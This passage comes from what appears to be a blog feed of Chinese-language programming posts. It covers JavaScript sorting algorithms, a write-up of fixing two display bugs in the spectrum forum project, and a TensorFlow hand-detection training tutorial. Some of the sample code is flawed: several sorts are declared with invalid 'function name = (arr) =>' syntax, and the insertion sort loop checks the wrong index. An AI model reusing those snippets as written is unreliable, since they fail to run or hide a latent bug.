const insertionSort = (arr) =&gt; &#123;  const n = arr.length;    // 假設第一個元素已經排好，所以從 1 開始跑  for (let i = 1; i &lt; n; i++) &#123;      // position 表示可以插入的位置    let position = i;      // 先把要插入的元素存起來    const value = arr[i];      // 開始往前找，只要符合這條件就代表這個位置是可以插入的    // 邊找的時候就可以邊把元素往後挪，騰出空間    while (i &gt;= 0 &amp;&amp; arr[position - 1] &gt; value) &#123;      [arr[position], arr[position - 1]] = [arr[position - 1], arr[position]];      position--;    &#125;      // 找到適合的位置，放入元素    arr[position] = value;  &#125;  return arr;&#125;

插入排序法的最佳情形出現在輸入元素已經是排序好的情況，這時候裡面的while只要跑一次就會結束了，所以時間複雜到就是外圈的O(n)而已。
這邊提一個小插曲，我當初在寫示範跟測試的程式碼的時候沒寫好，導致拿來測試的陣列都是已經排好的，我就想說：「怎麼插入排序法比快速排序法還快，不合理啊！」
合併排序法（Merge Sort）接著要進入到比較快的排序法了，合併排序法算是滿好理解的一個：

切一半，排好左邊，排好右邊，合併

談合併排序法的時候我喜歡先談合併這個步驟，其實就是把兩個各自排序好的陣列合併成一個。這一步其實也滿簡單，因為兩邊都已經排序好了嘛，所以就是不斷看兩邊的第一個元素，誰小就抓誰下來，接著左邊抓完就抓右邊，反之亦然。
（圖片來源：http://www.java2novice.com/java-sorting-algorithms/merge-sort/ ）
我自己之前在看合併排序的時候，發現可以寫成一個比較好懂，但是空間耗費比較多的版本：
const simpleMergeSort = (arr) =&gt; &#123;    // 合併  const merge = (leftArray, rightArray) =&gt; &#123;    let result = [];    let nowIndex = 0, left = 0, right = 0;    const leftLength = leftArray.length;    const rightLength = rightArray.length;      // 如果左右兩邊都沒抓完，就看誰比較小抓誰    while (left &lt; leftLength &amp;&amp; right &lt; rightLength) &#123;      if (leftArray[left] &lt; rightArray[right]) &#123;        result[nowIndex++] = leftArray[left++];      &#125; else &#123;        result[nowIndex++] = rightArray[right++];      &#125;    &#125;      // 跑到這裡代表左右兩邊其中一邊抓完了    // 如果是左邊沒抓完，全部抓下來    while (left &lt; leftLength) &#123;      result[nowIndex++] = leftArray[left++];    &#125;      // 右邊沒抓完，全部抓下來    while (right &lt; rightLength) &#123;      result[nowIndex++] = rightArray[right++];    &#125;      // 把合併好的陣列直接傳回去    return result;  &#125;  const _mergeSort = (arr) =&gt; &#123;    const length = arr.length;    if (length &lt;= 1) return arr;      // 切兩半    const middle = Math.floor(length / 2);      // 排左邊    const leftArray = _mergeSort(arr.slice(0, middle));      // 排右邊    const rightArray = _mergeSort(arr.slice(middle, length));      // 合併後丟回去    return merge(leftArray, rightArray);  &#125;  return _mergeSort(arr);&#125;

對我來說，比較簡單的理由是滿直覺的，你就直接用 slice 切成兩個陣列，排序好之後合併起來就好。
但比較省空間的做法是直接更改原來的陣列就好，這時候我們的參數會變得不太一樣：
function mergeSort = (arr) =&gt; &#123;  const merge = (array, start, middle, end) =&gt; &#123;        // 宣告一個暫時的陣列來放合併後的結果    let temp = [];    let nowIndex = 0;    let left = start;    let right = middle + 1;      // 這邊都跟上面一樣    while (left &lt;= middle &amp;&amp; right &lt;= end) &#123;      if (array[left] &lt; array[right]) &#123;        temp[nowIndex++] = array[left++];      &#125; else &#123;        temp[nowIndex++] = array[right++];      &#125;    &#125;      while (left &lt;= middle) &#123;      temp[nowIndex++] = array[left++];    &#125;      while (right &lt;= end) &#123;      temp[nowIndex++] = array[right++];    &#125;      // 要把合併後的陣列放回去 array[start ~ end]    for (let i = start; i &lt;= end; i++) &#123;      array[i] = temp[i - start];    &#125;  &#125;  // 代表要從 start 排到 end  const _mergeSort = (array, start, end) =&gt; &#123;    if (end &lt;= start) return;    const middle = Math.floor((start + end) / 2);      // 對左右兩半排序    _mergeSort(array, start, middle);    _mergeSort(array, middle + 1, end);    merge(array, start, middle, end);    return array;  &#125;  return _mergeSort(arr, 0, arr.length - 1);&#125;

因為是直接更改原本的陣列，所以要多傳幾個數字進去，代表我要排序這個陣列的那一段。而呼叫完之後，你就可以預設這一段的陣列已經是排序好的了。
基本上流程都跟上面簡單版的沒兩樣，但省了一些記憶體空間。
快速排序法（Quick Sort）快速排序法我一開始覺得滿複雜，知道原理之後就覺得沒那麼難了，其實原理滿簡單：

找一個數，並且把這個數調整到：讓左邊的元素比它小，右邊的元素比它大，再對左右兩遍做一樣的事

那個數我們稱作 pivot，會把數列分割成左右兩邊。
例如說現在有一個數列是：14, 7, 6, 9, 10, 20, 15
我們挑選 14 當作 pivot，調整過後變成：7, 6, 9 , 10, 14, 20, 15，左邊都比它小，右邊都比它大。
而當你把 14 調整好的時候，其實這個元素就排好了！因為左邊比它小，右邊比它大嘛，所以這一個數字就排好了。接著只要對左右兩邊還沒排好的也做快速排序就行了。
而快速排序的核心在於你要怎麼找到那個數，如果你找的數字剛好是數列的中位數，那當然效率最高。如果找的是最小的數，那就是最壞的情形，時間複雜度就變成O(n^2)，有分割跟沒分割一樣。
我們直接假設第一個數就是 pivot，這樣比較方便。
那再來有一個問題是，要怎麼把這個數字調整到左邊比它小，右邊比它大呢？我們可以維護一個變數叫做 splitIndex，讓這個 index 左邊的元素都比 pivot 小，而這個 index 本身以及它右邊的元素都比 pivot 大。
當你掃一遍陣列，發現某個元素比 pivot 小的時候，就把這個元素跟 splitIndex 上的元素交換，並且把 splitIndex + 1，就可以做到我們上面想做的事情了。最後記得把 pivot 跟 splitIndex - 1（也就是最後一個比它小的元素）交換，就能夠把 pivot 放到正確的位置上了。
可以參考下面的 gif，或是直接去VISUALGO看看。
（來源：https://github.com/hustcc/JS-Sorting-Algorithm/blob/master/6.quickSort.md ）
function quickSort = (arr) =&gt; &#123;  const swap = (array, i , j) =&gt; &#123;    [array[i], array[j]] = [array[j], array[i]];  &#125;  const partition = (array, start, end) =&gt; &#123;    let splitIndex = start + 1;    for (let i = start + 1; i &lt;= end; i++) &#123;      if (array[i] &lt; array[start]) &#123;        swap(array, i, splitIndex);        splitIndex++;      &#125;    &#125;      // 記得把 pivot 跟最後一個比它小的元素互換    swap(array, start, splitIndex - 1);    return splitIndex - 1;  &#125;  const _quickSort = (array, start, end) =&gt; &#123;    if (start &gt;= end) return array;      // 在 partition 裡面調整數列，並且回傳 pivot 的 index    const middle = partition(array, start, end);    _quickSort(array, start, middle - 1);    _quickSort(array, middle + 1, end);    return array;  &#125;;  return _quickSort(arr, 0, arr.length - 1);&#125;

堆排序（Heap Sort）Heap 是一種資料結構，並且有分兩種：max heap 跟 min heap，兩種的原理其實雷同，我們直接拿 max heap 來講。
先讓大家看一張 max heap 的圖片：
（資料來源：https://www.tutorialspoint.com/data_structures_algorithms/heap_data_structure.htm ）
大家可以發現，max heap 滿足了兩個性質：

父節點一定大於子節點
整個樹的根節點一定是最大值（可以由 1 推出來）

而要用陣列表示 heap 也很簡單，會像這樣：
（資料來源：http://notepad.yehyeh.net/Content/Algorithm/Sort/Heap/Heap.php ）
所以 heap sort 就是利用這個資料結構做排序，流程很簡單：

先把讀進來的陣列建成 max heap（這時候 arr[0] 一定是這陣列最大值）
把 arr[0] 跟最後一個節點互換（其實是最後一個還沒排序過的節點）
調整成 max heap，回到步驟 2

heap sort 其實有點複雜，複雜到可以再獨立出來一篇了…
但簡單來說呢，就是改良版的選擇排序法，每一次都選最大值出來，然後把剩下的數字再調整成 max heap。
function heapSort = (arr) =&gt; &#123;    function heapify(arr, length, node) &#123;    const left = node * 2 + 1;    const right = node * 2 + 2;      // 先預設最大的節點是自己    let max = node;      if (left &lt; length &amp;&amp; arr[left] &gt; arr[max]) &#123;      max = left;    &#125;      if (right &lt; length &amp;&amp; arr[right] &gt; arr[max]) &#123;      max = right;    &#125;      // 如果左右兩邊有任何一個比 node 大的話    if (max !== node) &#123;      // 就把兩個互換      [arr[node], arr[max]] = [arr[max], arr[node]];        // 接著繼續 heapfiy      heapify(arr, length, max);    &#125;  &#125;    // build max heap  const length = arr.length;  for (let i = Math.floor(length / 2) - 1; i&gt;=0; i--) &#123;    heapify(arr, length, i);  &#125;    // 排序  for (let i = length - 1; i &gt; 0; i--) &#123;    [arr[0], arr[i]] = [arr[i], arr[0]];    heapify(arr, i, 0);  &#125;  return arr;&#125;

總結其實仔細研究過後，就會發現每一個排序演算法都有值得參考的地方，而且每個排序法都滿有趣的。也會發現懂原理是一回事，寫不寫的出來又是另外一回事了。這篇就當作自己的排序法筆記吧，如果有任何錯誤麻煩不吝指出。
如果想要自己玩玩看的話，我有放到 Github 上，有寫好 testcase，改一改就可以直接測了，應該滿方便的。
因為要測試的關係，所以每個排序法前面都會加上：arr = arr.slice()避免修改到原本的 array。
測試的過程也滿有趣的，我發現有些 ES6 語法（例如說很潮的交換語法或甚至是let）有時候會拖慢執行速度，因此我之前有把語法全部改回 ES5，發現效率快了不少，但這篇因為重點不在效能，所以還是全部用 ES6 的語法。
參考資料
[演算法] 堆積排序法(Heap Sort)
常见排序算法 - 堆排序 (Heap Sort)
排序之堆積排序法(Heap Sort)
js算法:heap sort 使用堆排序
JS-Sorting-Algorithm&#x2F;7.heapSort.md
用 JavaScript 學習資料結構和演算法：排序（Sort）與搜尋（Search）篇

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>sort, algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>記一次幫開源專案 spectrum 修 bug 的經歷</title>
    <url>/2019/04/20/spectrum-pull-request/</url>
    <content><![CDATA[前言最近又開始了自己的教學計畫，第一期的時候寫了這篇：利用 Github Classroom 加 Travis CI 打造改作業系統，第二期寫了這篇：AWS Lambda + GitHub API + Google Sheet &#x3D; 自動化簽到系統，都是利用現成工具來快速湊出符合自己需求的系統。
而第三期開始前我希望課程能有個討論區，讓學生們可以在上面很方便地問問題。一直以來都是用 Slack，但 Slack 最大的缺點就是免費版會吃訊息，很多不錯的資訊被洗掉就覺得滿可惜的，希望能有個論壇或是討論區之類的地方會比較好。
在兩年前我也寫過一篇：自架論壇的解決方案：flarum, github issue, nodeBB, discourse，研究了幾套方案，最後選擇 GitHub Issue。因為最簡單、最方便，但最大的缺點是學生好像不太習慣，因為左看右看上看下看其實都不像是個論壇。
前陣子因緣際會之下知道了這一個平台：spectrum，首頁的 slogan 寫得很清楚：

The community platform for the future.

去年被 GitHub 買下來之後變成完全免費的，以前付費版的功能也變免費了。在我看來，其實就是「更像討論區」的 Slack。先給大家看一張截圖：

最左邊是不同的 workspace，這跟 Slack 一樣。再來你可以看到各個 Channles，這跟 Slack 也一樣，唯一不同的是右邊，原本 Slack 的訊息變成了一個個討論串，有標題跟內文。
這樣你大概可以懂我在說什麼了，這套跟 Slack 很像，但是更適合當作是討論區。
免費、背後是 GitHub、可以有 private 的論壇、開源，這簡直是完美的解決方案。除了沒有手機 App 以外，其他沒什麼可以挑剔的，就決定是這一套了！
事情沒有那麼順利…開始試用幾天之後，發現有一個超級大問題，雖然說在功能上沒什麼問題，但是在體驗上我覺得極差，這一個小缺點就足夠讓我放棄這個平台。
是什麼問題呢？排版。
spectrum 原生支援 Markdown，使用起來十分順手，可是換行卻出了問題。在有些地方只有空行是沒有用的，結尾要加兩個空格才會換行，雖然我覺得這很不方便，但勉強可以接受。
可是！在 spectrum 上面，要兩個換行才會真的換行。
底下是範例，最下面的 line1 跟 line2 應該要換行：

可是 po 文之後卻會變成這樣：

換行變成了空格，如果是英文還好，但如果是中文的話排版就變得超級無敵奇怪，完全不能接受。
心灰意冷的我去了官方討論區發文，想說會不會有什麼其他換行的方法只是我不知道。
結果官方給我的回覆是：「對，現在你只能換行兩次才會真的換行」。
原本槁木死灰的我想說那就乾脆放棄吧，研究看看有沒有其他解法，甚至還一度想說要不要自己寫一套出來，但一想到要支援一大堆功能就覺得很麻煩，遲遲無法下定決心。
經過幾天的深思之後，覺得 spectrum 這個平台真的很好，但唯一的缺點就是排版問題，如果這個缺點解決了，沒道理不用它。
馬特拉不拉，我們自己拉。官方有 bug 沒空修，沒關係，我們自己修！這就是開源的好處。
修 bug 之旅要幫開源專案修 bug 的第一步很簡單，就是想辦法把整個環境跑起來。你要有辦法在本機跑起來才有辦法驗證自己到底有沒有修成功，所以官方文件是很重要的。
spectrum 的文件很齊全，有一連串的指示告訴你應該要怎麼做。照著做之後，就能把前後端都在自己的 local 跑起來了。
在等待安裝這些套件的途中，可以自己稍微猜一下問題出在哪裡。那時的我猜說應該是 markdown 的編輯器出了什麼問題，可能在把 markdown 轉成 HTML 的時候出了問題，沒有處理好，所以少了換行。
光猜是沒有用的，第一步要縮小問題範圍並且定位問題，先找出最重要的發文這一段到底發生了什麼事情。
在 Chrome 我們可以用 React Devtool，看到發文的介面是一個叫做 composer 的 component。接著在 composer&#x2F;index.js 裡面可以看到是由一個叫做 Inputs 的元件負責。
在 Inputs.js 裡面發現了一件驚人的事情，原來按下 Preview 的時候，會直接送 request 到一個寫死的路徑並且把結果顯示出來：
const onClick = (show: boolean) =&gt; &#123;  setShowPreview(show);    if (show) &#123;    setPreviewBody(null);    fetch(&#x27;https://convert.spectrum.chat/from&#x27;, &#123;      method: &#x27;POST&#x27;,      body,    &#125;)      .then(res =&gt; &#123;        if (res.status &lt; 200 || res.status &gt;= 300)          throw new Error(&#x27;Oops, something went wrong&#x27;);        return res.json();      &#125;)      .then(json =&gt; &#123;        setPreviewBody(json);      &#125;);  &#125;&#125;;

既然轉換是 Server 做的，那接下來就要來找找 Server 到底做了什麼。
可是我又不知道https://convert.spectrum.chat/from是對應到 Server 的哪裡，要怎麼找到 Server 是怎麼處理的呢？
這邊可以換一個想法，雖然說預覽的時候的確是送到這邊沒錯，但是發文的時候 Server 一定也會處理這個格式轉換，所以可以先找出發文的時候 Server 到底做了什麼，應該會有一些線索。
接著在前端發文之後查看 Network tab，因為後端是 GraphQL 所以滿好看的，是一個叫做publushThread的操作。
立刻往 Server 的部分找，循線找到了這個檔案：publishThread.js，並且發現裡面呼叫了一個 processThreadContent 來做轉換。
往下追這個 function，看程式碼之後發現這應該是最底層了：
// @flowimport &#123; stateFromMarkdown &#125; from &#x27;draft-js-import-markdown&#x27;;import &#123; convertFromRaw, convertToRaw, EditorState &#125; from &#x27;draft-js&#x27;;import &#123; addEmbedsToEditorState &#125; from &#x27;./add-embeds-to-draft-js&#x27;;  export default (type: &#x27;TEXT&#x27; | &#x27;DRAFTJS&#x27;, body: ?string): string =&gt; &#123;  let newBody = body;  if (type === &#x27;TEXT&#x27;) &#123;    // workaround react-mentions bug by replacing @[username] with @username    // @see withspectrum/spectrum#4587    newBody = newBody ? newBody.replace(/@\[([a-z0-9_-]+)\]/g, &#x27;@$1&#x27;) : &#x27;&#x27;;    newBody = JSON.stringify(      convertToRaw(        stateFromMarkdown(newBody, &#123;          customBlockFn: elem =&gt; &#123;            if (elem.nodeName !== &#x27;PRE&#x27;) return;              const code = elem.childNodes.find(node =&gt; node.nodeName === &#x27;CODE&#x27;);            if (!code) return;              const className = code.attributes.find(              (&#123; name &#125;) =&gt; name === &#x27;class&#x27;            );            if (!className) return;              const lang = className.value.replace(&#x27;lang-&#x27;, &#x27;&#x27;);              return &#123;              type: null,              data: &#123;                language: lang,              &#125;,            &#125;;          &#125;,          parserOptions: &#123;            atomicImages: true,            breaks: true,          &#125;,        &#125;)      )    );  &#125;    // Add automatic embeds to body  try &#123;    return JSON.stringify(addEmbedsToEditorState(JSON.parse(newBody || &#x27;&#x27;)));    // Ignore errors during automatic embed detection  &#125; catch (err) &#123;    console.error(err);    return newBody || &#x27;&#x27;;  &#125;&#125;;

而且沒有看出任何跡象，看起來一切正常。此時的我想說：該不會要往下追到 draft-js 或是其他的 library 吧？
但是既然都找到這了，應該先來看一下它轉出來會是什麼東西，再決定下一步該怎麼辦，於是我在這個 function 加了 log，把它最後轉換的東西印出來。
我的輸入是：
onelinenewline  thirdline  fourline  fiveline

輸出是：
&#123;  &quot;blocks&quot;:[    &#123;      &quot;key&quot;:&quot;bq56i&quot;,      &quot;text&quot;:&quot;oneline\nnewline\nthirdline&quot;,      &quot;type&quot;:&quot;unstyled&quot;,      &quot;depth&quot;:0,      &quot;inlineStyleRanges&quot;:[],      &quot;entityRanges&quot;:[],      &quot;data&quot;:&#123;&#125;    &#125;,    &#123;      &quot;key&quot;:&quot;9h38b&quot;,      &quot;text&quot;:&quot;fourline&quot;,      &quot;type&quot;:&quot;unstyled&quot;,      &quot;depth&quot;:0,      &quot;inlineStyleRanges&quot;:[],      &quot;entityRanges&quot;:[],      &quot;data&quot;:&#123;&#125;    &#125;,    &#123;      &quot;key&quot;:&quot;fuprm&quot;,      &quot;text&quot;:&quot;fiveline&quot;,      &quot;type&quot;:&quot;unstyled&quot;,      &quot;depth&quot;:0,      &quot;inlineStyleRanges&quot;:[],      &quot;entityRanges&quot;:[],      &quot;data&quot;:&#123;&#125;    &#125;  ],  &quot;entityMap&quot;:&#123;&#125;&#125;

不印則已，一印驚人！
沒想到上面的測資轉換出來是：&quot;text&quot;:&quot;oneline\nnewline\nthirdline&quot;，看來 Server 的轉換完全正常，換行被轉為\n，兩個換行被轉為一個新的 block，看來問題是出在前端沒有把這個換行好好輸出。
接著再用差不多的方法一樣用 React Devtool 來看，發現前端顯示是 threadDetail.js 在處理，而裡面呼叫了 threadRenderer.js，看來這就是真的 render 的地方了。
找到 threadRenderer.js 之後，發現裡面只是單純地呼叫了 redraft 這個 library。
好，雖然又有新的東西要研究，但離答案愈來愈近了。
仔細看了一下 redraft 的文件，看起來是可以自定義每一個型態最後的輸出要長什麼樣子。往下把官方文件看完，發現有一區是 Common issues
，裡面寫著：

Can the multiple spaces between text be persisted?
Add white-space: pre-wrap to a parent div, this way it will preserve spaces and wrap to new lines (as editor js does)

看到這邊，答案已經很明顯了，就是前端顯示忘記加 white-space: pre-wrap，所以預設的行為會把換行當作是空格。
真相大白的時候我在心裡暗罵了一聲髒話，但是是罵自己。因為這問題在前端其實滿常見的，我也用過這屬性很多次。可是在我看到這問題的時候我第一點居然是往後端去懷疑，完全沒想到有可能是前端的問題，更沒有想到原來是加一行 CSS 就可以搞定的事。
接著就先發了一個 Issue 記錄了一下調查的過程跟成因，然後發了個 PR，雖然只是改這麼一行而已，但是對我意義重大。因為只要這個 bug 修好，這套就立刻海放其他現成的論壇系統。
他們的速度很快，發 PR 之後隔天就被 merge 了，再隔個一週就被 deploy 到 production 了，真的很有效率。
意猶未盡，再修一個！雖然只有一行，但探索的過程獲益良多，而且 PR 能被 merge 就很開心。既然都修了一個，那來找找看有沒有其他容易修的好了，可以一起順手修掉。
在官方的 Issues 翻一翻，找到一個看起來不難的：Weird image failed rendering in thread body，這個 Issue 很簡單，就是不知道為什麼會出現下面的 bug：

文字覆蓋住了後面的圖片。
Issue 裡面有附上原文網址，點進去以後用 devtool 看了一下，發現問題出在當瀏覽器無法載入 img 標籤的圖片時，就會變成這樣。
我之前完全沒碰過這問題，但自己試了一下，發現 img 原本有 margin，可是在圖片沒辦法載入的時候會失效。直覺告訴我這可能是 margin collapsing 有關的問題。
後來我自己試了一下，問題出在當圖片無法載入，img 的高度就會變成 0，然後 margin 就會失效。因為一些排版跟 CSS 的元素，下面的文字就會蓋上來，變成下面的圖片那樣。

那有什麼好解法嗎？
我發現一個最簡單的解法就是加上 alt 屬性，當圖片無法載入時就會就會顯示這個文字，img 就能保有高度，margin 也能作用。

查到解法之後一樣先回在 Issue 下面跟他們討論，看他們覺得如何。
後來我發現原本上傳圖片時其實就有設定 alt，但可能在一些邊界條件下會是空的，或者是使用者手動把 alt 移除掉。
所以最後的解法也很簡單，就是幫 alt 加一個預設值，PR: Add default alt text to img：
-  &lt;img key=&#123;key&#125; src=&#123;data.src&#125; alt=&#123;data.alt&#125; /&gt;,+  &lt;img key=&#123;key&#125; src=&#123;data.src&#125; alt=&#123;data.alt || &#x27;Image&#x27;&#125; /&gt;

總結雖然只有貢獻了兩行，但能看到自己的帳號出現在 release log 上面還是滿開心的：

如果是以前的自己，我絕對不會幹這種事。絕對是發現 bug 之後就停住了，然後等著官方團隊來修 bug。
但這幾年漸漸開始熟悉起看其他人的 code，工作的時候偶爾沒事就可以看一下 redux-form 或是 redux 的 source code 等等，看著看著覺得也沒那麼可怕。而且 GitHub 還有個超好用功能叫做「搜尋」，很多時候直接搜關鍵字就能找到相關的原始碼，節省超級多時間。
在看其他人的專案時，我覺得最難的是定位問題，一但你定位問題之後其他都沒那麼難了，因為你已經知道是哪個檔案、哪段程式碼有問題，接著只要朝那邊去研究就好。至於該怎麼定位問題，有以下幾個建議：

直接搜尋程式碼，看能不能找到相關段落
利用 devtool 找出相關的元件
看文件，看上面有沒有附一些架構

當你要修 bug 的時候，方向是很明確的，沒有必要整個專案都看過，只要找到你要修的地方就好。這一篇希望能分享我的經驗給大家。
最後，當個工程師真好，有開源專案真好，有 bug 都可以自己修掉。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>github</tag>
        <tag>open source</tag>
        <tag>spectrum</tag>
      </tags>
  </entry>
  <entry>
    <title>如何用 TensorFlow object detection API 的 Single Shot MultiBox Detector 來做 hand detection</title>
    <url>/2019/02/16/ssd-hand-detection-with-tensorflow-object-detection-api/</url>
    <content><![CDATA[前言今天要來教大家怎麼用 TensorFlow 的 Object Detection API 來偵測人的手，因為筆者最近在使用 這個 repo 的 code時，還是遇到了一些問題，需要自己再去找資料解決，所以決定基於前人的基礎之上再補充說明一些
相比起去年寫過的 一起來玩 OSRF 的 TensorFlow Object Detector，這一篇會有更多對於演算法和細節的敘述，讓大家之後也可以自己學習深入研究各個 model。
TensorFlow Object Detection API 的使用流程在一開始，先知道所有要做的步驟，會對於整個流程比較有概念：

假設，你今天是只想拿別人現成的結果來做 hand detection，那你可以不需要會上面這一串步驟，你只需要會最後一步 - Inference，拿到現成的 frozen_inference_graph.pb，再寫個程式直接使用這個frozen_inference_graph.pb來 inference 就好 （請參考 這個範例）。
但如果你對結果不滿意，想要再 finetune 現有的 model；或是你不想要只偵測手，你可能還想分辨是左手還是右手（也就是 model 的輸出類別要變），那你就會需要學會整個流程了，而這篇教學就希望可以達到這個目的。

我假設大家都已經有 Python、TensorFlow 這些東西了，沒有的話可以先去安裝一下。

Dataset download &amp; Image annotationDataset 的準備常常是在做 Deep Learning 研究最麻煩的一塊，如果要自己去準備，是可以拿一台相機就出去開始拍，或上網爬下一堆圖片，然後再一張張慢慢標註。（可以用 labelImg 或 labelme）
Hand dataset 是有一些選擇，比較有名的包含 University of Oxford 的 Hand Dataset 和 Indiana Univeristy 的 EgoHands。
因為這些 dataset 都算足夠量的圖片加上 ground truth data，所以我們可以直接拿這些 dataset 來用，我們先假設我們是用 EgoHands。
但因為 TemsorFlow Object Detection API 需要吃的是 TF record 格式的檔案，所以我們還需要做的準備是：

把 dataset 裡面的的格式轉成 csv
把 csv 的內容轉成 TF record

之所以要先轉成 csv 是因為 csv 是相對方便我們看 ground truth data 有沒有問題的。
關於把 EgoHands 的 labels 轉成自己的 csv 檔，你可以參考 egohands_dataset_clean.py，其中最關鍵的地方就是這個 function，把 EgoHands 裡面原本存的 label 讀出來並寫到 csv 當中。
def get_bbox_visualize(base_path, dir):image_path_array = []for root, dirs, filenames in os.walk(base_path + dir):for f in filenames:if(f.split(&quot;.&quot;)[1] == &quot;jpg&quot;):img_path = base_path + dir + &quot;/&quot; + fimage_path_array.append(img_path)#sort image_path_array to ensure its in the low to high order expected in polygon.matimage_path_array.sort()boxes = sio.loadmat(base_path + dir + &quot;/polygons.mat&quot;)# there are 100 of these per folder in the egohands datasetpolygons = boxes[&quot;polygons&quot;][0]# first = polygons[0]# print(len(first))pointindex = 0for first in polygons:index = 0font = cv2.FONT_HERSHEY_SIMPLEXimg_id = image_path_array[pointindex]img = cv2.imread(img_id)img_params = &#123;&#125;img_params[&quot;width&quot;] = np.size(img, 1)img_params[&quot;height&quot;] = np.size(img, 0)head, tail = os.path.split(img_id)img_params[&quot;filename&quot;] = tailimg_params[&quot;path&quot;] = os.path.abspath(img_id)img_params[&quot;type&quot;] = &quot;train&quot;pointindex += 1boxarray = []csvholder = []for pointlist in first:pst = np.empty((0, 2), int)max_x = max_y = min_x = min_y = height = width = 0findex = 0for point in pointlist:if(len(point) == 2):x = int(point[0])y = int(point[1])if(findex == 0):min_x = xmin_y = yfindex += 1max_x = x if (x &gt; max_x) else max_xmin_x = x if (x &lt; min_x) else min_xmax_y = y if (y &gt; max_y) else max_ymin_y = y if (y &lt; min_y) else min_y# print(index, &quot;====&quot;, len(point))appeno = np.array([[x, y]])pst = np.append(pst, appeno, axis=0)cv2.putText(img, &quot;.&quot;, (x, y), font, 0.7,(255, 255, 255), 2, cv2.LINE_AA)hold = &#123;&#125;hold[&#x27;minx&#x27;] = min_xhold[&#x27;miny&#x27;] = min_yhold[&#x27;maxx&#x27;] = max_xhold[&#x27;maxy&#x27;] = max_yif (min_x &gt; 0 and min_y &gt; 0 and max_x &gt; 0 and max_y &gt; 0):boxarray.append(hold)labelrow = [tail,np.size(img, 1), np.size(img, 0), &quot;hand&quot;, min_x, min_y, max_x, max_y]csvholder.append(labelrow)cv2.polylines(img, [pst], True, (0, 255, 255), 1)cv2.rectangle(img, (min_x, max_y),(max_x, min_y), (0, 255, 0), 1)csv_path = img_id.split(&quot;.&quot;)[0]if not os.path.exists(csv_path + &quot;.csv&quot;):cv2.putText(img, &quot;DIR : &quot; + dir + &quot; - &quot; + tail, (20, 50),cv2.FONT_HERSHEY_SIMPLEX, 0.75, (77, 255, 9), 2)cv2.imshow(&#x27;Verifying annotation &#x27;, img)save_csv(csv_path + &quot;.csv&quot;, csvholder)print(&quot;===== saving csv file for &quot;, tail)cv2.waitKey(2) # close window when a key press is detected

成功執行完，你就可以得到如下的 csv 檔（class 我有自己改過，如果是跑範例的程式碼，都會是 hand）：

若你想要修改自己的 class，那就需要去改上面那段程式碼的這一行：
labelrow = [tail,np.size(img, 1), np.size(img, 0), &quot;hand&quot;, min_x, min_y, max_x, max_y]

把 “hand” 用其他方式取代。
Label map preparation &amp; TF Record generation當你有了 csv 檔之後，接下來你還會需要轉成 TF record 檔，所以你會需要用 generate_tfrecord.py 來產生你的 TF record 檔。
其中有一個關鍵的地方是，TF Record 吃的類別是數字，所以你需要自己去注意數字跟類別間的對應關係，而這個對應關係是由 hand_label_map.pbtxt 來描述：
item &#123;id: 1name: &#x27;hand&#x27;&#125;

所以你在用 產生 TF record 檔時，要很注意這一段 code：
# TO-DO replace this with label mapdef class_text_to_int(row_label):if row_label == &#x27;nine&#x27;:return 1elif row_label == &#x27;ten&#x27;:return 2elif row_label == &#x27;jack&#x27;:return 3elif row_label == &#x27;queen&#x27;:return 4elif row_label == &#x27;king&#x27;:return 5elif row_label == &#x27;ace&#x27;:return 6else:return None

在我們的應用中，你會改成：
# TO-DO replace this with label mapdef class_text_to_int(row_label):if row_label == &#x27;hand&#x27;:return 1else:return None

Pipeline configuration前面的步驟是為了產生 TF record 和 label map，最後只要把你的 config 檔設定好就好，因為我們沒有要重新訓練一個模型，而是拿人家已經用 Coco dataset pretrain 好的 SSD 來 finetune，所以可以參考這個資料夾 裡面的 ssd_mobilenet_v1_coco.config。
裡面比較常改的地方是

Training step 數（一般我們都是訓練到再增加結果也不會變好）
num_steps: 200000

指定 training data 的 TF record 檔跟 label map：


train_input_reader: &#123;tf_record_input_reader &#123;input_path: &quot;PATH_TO_DATA/train.record&quot;&#125;label_map_path: &quot;PATH_TO_DATA/hand_label_map.pbtxt&quot;&#125;


指定 training data 的 TF record 檔跟 label map：

eval_input_reader: &#123;tf_record_input_reader &#123;input_path: &quot;PATH_TO_DATA/test.record&quot;&#125;label_map_path: &quot;hand_inference_graph/hand_label_map.pbtxt&quot;shuffle: falsenum_readers: 1num_epochs: 1&#125;

以上就是要自己做 training 的所有事前準備工作。因為有很多東西是別人寫過的，我並沒有重複寫得很詳細，如果：

你用 Windows，請看 How To Train an Object Detection Classifier for Multiple Objects Using TensorFlow (GPU) on Windows 10
你用 Linux，請看 Hand Detection Tutorial

Training如果上面的步驟都已經做完， training 就只是跑幾行指令而已：
cd C:\Users\rosindigo\Documents\GitHub\object_detection_training_env\models\research\object_detectionset PYTHONPATH=C:\Users\rosindigo\Documents\GitHub\object_detection_training_env\models;C:\Users\rosindigo\Documents\GitHub\object_detection_training_env\models\research;C:\Users\rosindigo\Documents\GitHub\object_detection_training_env\models\research\slimpython train.py --logtostderr --train_dir=training/ --pipeline_config_path=training/ssd_mobilenet_v1_coco.config

如果 train 完想要看一下結果，可以用 tensorboard 看一下：
tensorboard --logdir=training

如果結果滿意，就可以輸出 frozen graph：
python export_inference_graph.py –input_type image_tensor –pipeline_config_path training&#x2F;ssd_mobilenet_v1_coco.config –trained_checkpoint_prefix training&#x2F;model.ckpt –output_directory inference_graph
怎麼評估自己 finetune 完的 model 是否夠好？在上面訓練的過程中，你可以看到每個 step 的 loss 有多少，一般來說我們會希望訓練到 2 以下，算是可以有還 OK 的辨識效果。
如果你想做更嚴謹的 evaluation，我跟大家推薦 Object-Detection-Metrics，只要將 test data 的 ground truth 跟你的辨識結果都輸出到 txt 檔，就可以跑裡面提供的程式來畫出 Precision-Recall Curve，得到 AP 和 mAP，頗為方便。
總結今天跟大家分享了要怎麼用 TensorFLow object detection API 來訓練和辨識手，希望透過學習流程，大家也可以將這個技術應用到自己有興趣的領域！
延伸閱讀
How to Build a Real-time Hand-Detector using Neural Networks (SSD) on Tensorflow
Hand Detection Tutorial
SSD: Single Shot MultiBox Detector

關於作者：@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。
]]></content>
      <tags>
        <tag>TensorFlow, Deep Learning, Computer Vision, Hand detection</tag>
      </tags>
  </entry>
  <entry>
